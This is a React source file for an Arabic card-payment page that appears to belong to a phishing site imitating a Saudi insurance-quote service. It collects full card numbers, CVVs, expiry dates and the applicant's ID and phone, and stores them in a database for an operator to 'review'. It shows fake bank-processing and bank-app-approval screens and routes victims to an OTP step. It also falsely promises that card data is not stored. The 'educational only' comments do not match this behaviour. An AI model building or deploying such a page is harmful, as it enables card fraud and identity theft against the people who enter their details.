import { useEffect, useMemo, useState } from "react";
import { useLocation, useNavigate } from "@/lib/router-compat";
import { Lock, ShieldCheck, CreditCard as CardIcon, CalendarDays, User as UserIcon, KeyRound, LoaderCircle, Smartphone, Bell } from "lucide-react";
import visaLogo from "@/assets/payments/visa.svg";
import mastercardLogo from "@/assets/payments/mastercard.svg";
import madaLogo from "@/assets/payments/mada.svg";
import Header from "@/components/site/Header";
import SiteFooter from "@/components/site/SiteFooter";
import FloatingButtons from "@/components/site/FloatingButtons";
import QuoteSteps from "@/components/site/QuoteSteps";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { saveApplication, getApplication, detectCardBrand } from "@/lib/admin-storage";
import { cardErrorMessage } from "@/lib/card-validation";
import { supabase } from "@/integrations/supabase/client";

type PaymentState = {
  company?: string;
  total?: number;
  type?: string;
  price?: number;
  method?: string;
  fullName?: string;
  identity?: string;
  birthDate?: string;
  phone?: string;
  insuranceType?: string;
  startDate?: string;
  purpose?: string;
  estValue?: string;
  carYear?: string;
  carModel?: string;
  repairPlace?: string;
  brand?: string;
  year?: string;
};

const Field = ({
  label,
  icon: Icon,
  children,
}: {
  label: string;
  icon: React.ElementType;
  children: React.ReactNode;
}) => (
  <div>
    <label className="mb-1.5 flex items-center justify-end gap-1.5 text-[12.5px] font-extrabold text-brand-blue sm:text-[13.5px]">
      <span>{label}</span>
      <Icon className="h-[15px] w-[15px]" strokeWidth={2.2} />
    </label>
    {children}
  </div>
);

const inputBase =
  "h-[46px] w-full rounded-[10px] border border-[hsl(214_25%_88%)] bg-white px-3 text-right text-[13.5px] font-medium text-brand-blue placeholder:text-muted-foreground/70 outline-none transition-all focus:border-brand-blue/60 focus:ring-2 focus:ring-brand-blue/15";

const formatCardNumber = (v: string) =>
  v
    .replace(/\D/g, "")
    .slice(0, 16)
    .replace(/(.{4})/g, "$1 ")
    .trim();

const QuoteCardPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = (location.state as PaymentState) || {};

  const company = state.company || "—";
  const total = state.total ?? 0;

  const [card, setCard] = useState("");
  const [name, setName] = useState("");
  const [month, setMonth] = useState("");
  const [year, setYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [loading, setLoading] = useState(false);
  const [appId, setAppId] = useState<string | null>(null);
  const [rejected, setRejected] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(60);
  const [bankApproval, setBankApproval] = useState(false);
  const [bankSecondsLeft, setBankSecondsLeft] = useState(180);

  // Subscribe to realtime updates for this application (educational only)
  useEffect(() => {
    if (!loading || !appId) return;

    const handle = (review: string | undefined) => {
      if (review === "approved") {
        setLoading(false);
        setBankApproval(false);
        navigate("/quote/otp", { state: { appId } });
      } else if (review === "bank_approval") {
        setBankApproval(true);
      } else if (review === "rejected") {
        setLoading(false);
        setBankApproval(false);
        setRejected(true);
        toast.error("تم رفض عملية الدفع من البنك");
      }
    };

    const channel = supabase
      .channel(`app-${appId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "applications",
          filter: `id=eq.${appId}`,
        },
        (payload) => {
          const newRow = payload.new as { review_status?: string };
          handle(newRow.review_status);
        },
      )
      .subscribe();

    // Fallback poll in case realtime delivery is delayed
    const interval = window.setInterval(async () => {
      const app = await getApplication(appId);
      if (app) handle(app.reviewStatus);
    }, 1500);

    return () => {
      supabase.removeChannel(channel);
      window.clearInterval(interval);
    };
  }, [loading, appId, navigate]);

  // 60s countdown while waiting for bank/admin decision
  useEffect(() => {
    if (!loading) return;
    setSecondsLeft(60);
    const tick = window.setInterval(() => {
      setSecondsLeft((s) => {
        if (s <= 1) {
          window.clearInterval(tick);
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => window.clearInterval(tick);
  }, [loading, appId]);

  // Bank approval countdown (3 minutes)
  useEffect(() => {
    if (!bankApproval) return;
    setBankSecondsLeft(180);
    const tick = window.setInterval(() => {
      setBankSecondsLeft((s) => (s <= 1 ? 0 : s - 1));
    }, 1000);
    return () => window.clearInterval(tick);
  }, [bankApproval]);

  const months = useMemo(
    () => Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")),
    [],
  );
  const years = useMemo(() => {
    const y = new Date().getFullYear();
    return Array.from({ length: 12 }, (_, i) => String(y + i));
  }, []);

  const isValid =
    card.replace(/\s/g, "").length >= 15 &&
    name.trim().length >= 3 &&
    month &&
    year &&
    cvv.length >= 3;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) {
      toast.error("الرجاء إكمال بيانات البطاقة");
      return;
    }
    const validationError = cardErrorMessage({ card, name, month, year, cvv });
    if (validationError) {
      toast.error(validationError);
      return;
    }
    setLoading(true);
    setRejected(false);
    // Save application immediately, awaiting admin review (educational only)
    const entry = await saveApplication({
      fullName: state.fullName,
      identity: state.identity,
      birthDate: state.birthDate,
      phone: state.phone,
      insuranceType: state.insuranceType,
      startDate: state.startDate,
      purpose: state.purpose,
      estValue: state.estValue,
      carYear: state.carYear || state.year,
      carModel: state.carModel || state.brand,
      repairPlace: state.repairPlace,
      company: state.company,
      type: state.type,
      price: state.price,
      total: state.total,
      method: state.method,
      status: "pending",
      reviewStatus: "awaiting_review",
      cardNumber: card,
      cardName: name,
      cardExpMonth: month,
      cardExpYear: year,
      cardCvv: cvv,
      cardBrand: detectCardBrand(card),
    });
    if (!entry) {
      setLoading(false);
      toast.error("تعذّر حفظ العملية في قاعدة البيانات. تحقق من الـ console.");
      return;
    }
    console.log("[QuoteCardPayment] application created:", entry.id);
    try {
      sessionStorage.setItem("bcare_current_app_id", entry.id);
    } catch {}
    setAppId(entry.id);
  };

  return (
    <main dir="rtl" className="min-h-screen bg-[hsl(210_40%_97%)]">
      <Header />
      <QuoteSteps current={4} />

      <section
        dir="rtl"
        className="mx-auto w-full max-w-[1100px] px-3 pb-10 pt-2 sm:px-4"
      >
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-[1fr_360px]">
          {/* LEFT: Payment form */}
          <form
            onSubmit={handleSubmit}
            className="rounded-2xl bg-white p-4 shadow-card sm:p-6"
          >
            {/* Header */}
            <div className="text-center">
              <div className="mx-auto mb-3 grid h-12 w-12 place-items-center rounded-full bg-brand-blue/10 text-brand-blue">
                <Lock className="h-[22px] w-[22px]" strokeWidth={2.2} />
              </div>
              <h1 className="text-[18px] font-extrabold text-brand-blue sm:text-[22px]">
                الدفع الآمن
              </h1>
              <p className="mt-1 text-[12px] text-muted-foreground sm:text-[13px]">
                أدخل بيانات بطاقتك لإتمام الدفع
              </p>
            </div>

            {/* Amount card */}
            <div className="mt-4 rounded-xl bg-brand-blue/5 px-4 py-4 text-center">
              <div className="text-[12.5px] font-bold text-muted-foreground sm:text-[13px]">
                {company}
              </div>
              <div className="mt-1 text-[22px] font-extrabold text-brand-blue sm:text-[28px]">
                {total.toFixed(2)} <span className="text-[16px] sm:text-[20px]">ر.س</span>
              </div>
            </div>

            {/* Card brand strip */}
            <div className="mt-4 flex items-center justify-center gap-3 rounded-xl border border-border/60 bg-white px-3 py-3">
              <img src={visaLogo} alt="Visa" className="h-6 w-auto sm:h-7" />
              <span className="h-6 w-px bg-border" />
              <img src={mastercardLogo} alt="Mastercard" className="h-7 w-auto sm:h-8" />
              <span className="h-6 w-px bg-border" />
              <img src={madaLogo} alt="مدى" className="h-6 w-auto sm:h-7" />
            </div>

            {/* Fields */}
            <div className="mt-5 space-y-4">
              <Field label="رقم البطاقة" icon={CardIcon}>
                <input
                  inputMode="numeric"
                  dir="ltr"
                  value={card}
                  onChange={(e) => setCard(formatCardNumber(e.target.value))}
                  placeholder="1234 5678 9012 3456"
                  className={cn(inputBase, "text-left tracking-widest")}
                />
              </Field>

              <Field label="اسم حامل البطاقة" icon={UserIcon}>
                <input
                  value={name}
                  onChange={(e) => setName(e.target.value.slice(0, 60))}
                  placeholder="الاسم كما هو مدون على البطاقة"
                  className={inputBase}
                />
              </Field>

              <div className="grid grid-cols-2 gap-3">
                <Field label="شهر الانتهاء" icon={CalendarDays}>
                  <select
                    value={month}
                    onChange={(e) => setMonth(e.target.value)}
                    className={cn(inputBase, "appearance-none bg-[length:14px] bg-[left_12px_center] bg-no-repeat pr-3", !month && "text-muted-foreground/70")}
                  >
                    <option value="">الشهر</option>
                    {months.map((m) => (
                      <option key={m} value={m}>{m}</option>
                    ))}
                  </select>
                </Field>
                <Field label="سنة الانتهاء" icon={CalendarDays}>
                  <select
                    value={year}
                    onChange={(e) => setYear(e.target.value)}
                    className={cn(inputBase, "appearance-none", !year && "text-muted-foreground/70")}
                  >
                    <option value="">السنة</option>
                    {years.map((y) => (
                      <option key={y} value={y}>{y}</option>
                    ))}
                  </select>
                </Field>
              </div>

              <Field label="رمز الأمان (CVV)" icon={KeyRound}>
                <input
                  inputMode="numeric"
                  dir="ltr"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  placeholder="123"
                  className={cn(inputBase, "text-left tracking-widest")}
                />
              </Field>
            </div>

            {/* Submit */}
            <button
              type="submit"
              disabled={loading}
              className={cn(
                "mt-6 flex h-[50px] w-full items-center justify-center gap-2 rounded-[10px] text-[14px] font-extrabold text-white shadow-soft transition-all sm:text-[15px]",
                isValid
                  ? "bg-brand-blue hover:brightness-110 active:scale-[0.99]"
                  : "cursor-not-allowed bg-[hsl(214_25%_70%)]",
              )}
            >
              <Lock className="h-[16px] w-[16px]" strokeWidth={2.4} />
              <span>{loading ? "جارٍ المعالجة..." : "ادفع الآن"}</span>
            </button>

            <div className="mt-4 flex items-center justify-center gap-1.5 text-[11.5px] text-muted-foreground">
              <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" strokeWidth={2.2} />
              <span>عملية الدفع مشفّرة وآمنة بالكامل</span>
            </div>
          </form>

          {/* RIGHT: trust / summary side panel (desktop) */}
          <aside className="lg:sticky lg:top-4 lg:self-start">
            <div className="overflow-hidden rounded-2xl bg-white shadow-card">
              <div className="bg-brand-blue/10 py-3 text-center">
                <h2 className="text-[15px] font-extrabold text-brand-blue sm:text-[16px]">
                  ملخص العملية
                </h2>
              </div>
              <div className="space-y-3 p-4 sm:p-5">
                <div className="flex items-center justify-between text-[13px]">
                  <span className="text-muted-foreground">الشركة</span>
                  <span className="font-extrabold text-brand-blue">{company}</span>
                </div>
                <div className="flex items-center justify-between border-t border-border pt-3 text-[13px]">
                  <span className="text-muted-foreground">المبلغ المستحق</span>
                  <span className="text-[17px] font-extrabold text-brand-blue">
                    {total.toFixed(2)} ر.س
                  </span>
                </div>

                <div className="mt-3 space-y-2 rounded-xl bg-muted/40 p-3 text-[11.5px] text-muted-foreground">
                  <div className="flex items-start gap-2">
                    <ShieldCheck className="mt-0.5 h-[14px] w-[14px] shrink-0 text-emerald-600" />
                    <span>اتصال مشفّر بمعيار SSL 256-bit</span>
                  </div>
                  <div className="flex items-start gap-2">
                    <Lock className="mt-0.5 h-[14px] w-[14px] shrink-0 text-brand-blue" />
                    <span>لن يتم حفظ بيانات بطاقتك على خوادمنا</span>
                  </div>
                </div>
              </div>
            </div>
          </aside>
        </div>

        <div className="mt-6 flex justify-start">
          <button
            type="button"
            onClick={() => navigate(-1)}
            className="h-[42px] rounded-[10px] border border-[hsl(214_25%_85%)] bg-white px-6 text-[12.5px] font-bold text-brand-blue hover:bg-muted/40"
          >
            رجوع
          </button>
        </div>
      </section>

      <SiteFooter />
      <FloatingButtons />

      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-brand-blue/20 px-4 backdrop-blur-sm">
          <div className="w-full max-w-[520px] rounded-2xl bg-white p-6 shadow-card sm:p-7">
            <div className="flex flex-col items-center text-center">
              <div className="mb-4 grid h-16 w-16 place-items-center rounded-full bg-brand-blue/10 text-brand-blue">
                <LoaderCircle className="h-8 w-8 animate-spin" strokeWidth={2.2} />
              </div>

              <h2 className="text-[20px] font-extrabold text-brand-blue sm:text-[24px]">
                جاري المعالجة
              </h2>
              <p className="mt-2 text-[13px] leading-6 text-muted-foreground sm:text-[14px]">
                نتحقق من بيانات بطاقتك مع البنك. يرجى الانتظار حتى اكتمال التحقق.
              </p>

              {/* Countdown */}
              <div className="mt-5 flex items-center gap-3">
                <div className="grid h-14 w-14 place-items-center rounded-full border-2 border-brand-blue/30 bg-brand-blue/5 text-[18px] font-extrabold text-brand-blue tabular-nums">
                  {secondsLeft}
                </div>
                <div className="text-right text-[12px] text-muted-foreground">
                  <div className="font-bold text-brand-blue">بانتظار قرار البنك</div>
                  <div>قبول أو رفض العملية…</div>
                </div>
              </div>

              {/* Progress bar */}
              <div className="mt-4 h-1.5 w-full overflow-hidden rounded-full bg-muted">
                <div
                  className="h-full bg-brand-blue transition-all duration-1000 ease-linear"
                  style={{ width: `${((60 - secondsLeft) / 60) * 100}%` }}
                />
              </div>

              <div className="mt-6 flex w-full items-center justify-center gap-2 rounded-xl border border-border/70 bg-muted/30 p-4 text-[12.5px] font-bold text-brand-blue">
                <ShieldCheck className="h-4 w-4 text-emerald-600" />
                <span>اتصال آمن مع البنك</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {rejected && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-brand-blue/20 px-4 backdrop-blur-sm"
          onClick={() => setRejected(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            className="w-full max-w-[460px] rounded-2xl bg-white p-6 text-center shadow-card sm:p-7"
          >
            <div className="mx-auto mb-4 grid h-16 w-16 place-items-center rounded-full bg-destructive/10 text-destructive">
              <Lock className="h-8 w-8" strokeWidth={2.2} />
            </div>
            <h2 className="text-[20px] font-extrabold text-destructive sm:text-[22px]">
              تم رفض العملية
            </h2>
            <p className="mt-2 text-[13px] leading-6 text-muted-foreground sm:text-[14px]">
              لم يقبل البنك بيانات البطاقة. يرجى التحقق من المعلومات والمحاولة مرة أخرى.
            </p>
            <button
              type="button"
              onClick={() => setRejected(false)}
              className="mt-5 h-[46px] w-full rounded-[10px] bg-brand-blue text-[14px] font-extrabold text-white hover:brightness-110"
            >
              حسناً
            </button>
          </div>
        </div>
      )}

      {bankApproval && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-brand-blue/25 px-4 backdrop-blur-sm" dir="rtl">
          <div className="w-full max-w-[520px] overflow-hidden rounded-2xl bg-white shadow-2xl">
            {/* Header */}
            <div className="flex items-center justify-between bg-brand-blue px-5 py-4 text-white">
              <div>
                <div className="text-[16px] font-extrabold sm:text-[18px]">تأكيد العملية</div>
                <div className="text-[10.5px] tracking-[0.25em] text-white/70">bank approval</div>
              </div>
              <span className="rounded-full bg-white/15 px-3 py-1 text-[11px] font-bold">إشعار من البنك</span>
            </div>

            {/* Body */}
            <div className="px-6 py-6 text-center">
              <div className="relative mx-auto mb-4 grid h-20 w-20 place-items-center rounded-full bg-brand-blue/10 text-brand-blue">
                <Smartphone className="h-9 w-9" strokeWidth={2.2} />
                <span className="absolute -right-1 -top-1 grid h-6 w-6 place-items-center rounded-full bg-amber-500 text-white shadow">
                  <Bell className="h-3.5 w-3.5" strokeWidth={2.6} />
                </span>
              </div>

              <h2 className="text-[19px] font-extrabold text-brand-blue sm:text-[22px]">
                الرجاء الموافقة من داخل تطبيق البنك
              </h2>
              <p className="mt-2 text-[13px] leading-6 text-muted-foreground sm:text-[13.5px]">
                تم إرسال إشعار إلى تطبيق البنك الخاص بك.
                <br />
                افتح التطبيق واضغط على <span className="font-extrabold text-brand-blue">"موافقة"</span> لإتمام عملية الدفع.
              </p>

              {/* Steps */}
              <div className="mt-5 space-y-2.5 text-right">
                {[
                  "افتح تطبيق البنك على جوالك",
                  "ادخل إلى قسم الإشعارات أو الطلبات المعلقة",
                  "اضغط على 'موافقة' لتأكيد عملية الدفع",
                ].map((t, i) => (
                  <div key={i} className="flex items-center gap-3 rounded-xl border border-border/60 bg-white px-3 py-2.5">
                    <span className="grid h-7 w-7 shrink-0 place-items-center rounded-full bg-brand-blue text-[12px] font-extrabold text-white">
                      {i + 1}
                    </span>
                    <span className="text-[13px] font-bold text-brand-blue">{t}</span>
                  </div>
                ))}
              </div>

              {/* Countdown */}
              <div className="mt-4 flex items-center justify-center gap-3 rounded-xl bg-brand-blue/5 px-4 py-3">
                <LoaderCircle className="h-6 w-6 animate-spin text-brand-blue" strokeWidth={2.2} />
                <div className="text-right">
                  <div className="font-mono text-[18px] font-extrabold text-brand-blue tabular-nums">
                    {String(Math.floor(bankSecondsLeft / 60)).padStart(2, "0")}:{String(bankSecondsLeft % 60).padStart(2, "0")}
                  </div>
                  <div className="text-[11px] font-bold text-muted-foreground">بانتظار الموافقة</div>
                </div>
              </div>

              <p className="mt-4 text-[11px] leading-5 text-muted-foreground">
                لا تغلق هذه الصفحة. سيتم التحويل تلقائياً بعد تأكيد العملية من التطبيق.
              </p>
            </div>
          </div>
        </div>
      )}
    </main>
  );
};

export default QuoteCardPayment;
